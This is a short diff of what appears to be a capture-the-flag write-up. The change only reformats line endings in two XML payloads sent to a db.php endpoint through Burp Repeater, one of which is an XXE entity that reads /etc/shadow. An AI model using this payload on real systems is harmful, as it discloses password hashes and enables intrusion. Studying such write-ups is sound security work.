@@ -33,22 +33,22 @@ Yields
 + Send payload via Burp/Repeater.
 
 #### db.php payload:
-<?xml version="1.0" encoding="ISO-8859-1"?>
-		<bugreport>
-		<title>test</title>
-		<cwe>test</cwe>
-		<cvss>test</cvss>
-		<reward>test</reward>
-		</bugreport>
+<?xml version="1.0" encoding="ISO-8859-1"?>\
+		<bugreport>\
+		<title>test</title>\
+		<cwe>test</cwe>\
+		<cvss>test</cvss>\
+		<reward>test</reward>\
+		</bugreport>\
 
 #### payload file disclosure:
-<?xml  version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
-    		<bugreport>
-    		<title>&ent;</title>
-    		<cwe>test</cwe>
-    		<cvss>test</cvss>
-    		<reward>test</reward>
-    		</bugreport>
+<?xml  version="1.0" encoding="ISO-8859-1"?>\
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>\
+    		<bugreport>\
+    		<title>&ent;</title>\
+    		<cwe>test</cwe>\
+    		<cvss>test</cvss>\
+    		<reward>test</reward>\
+    		</bugreport>\
 
 Obtain Username: ${UN}
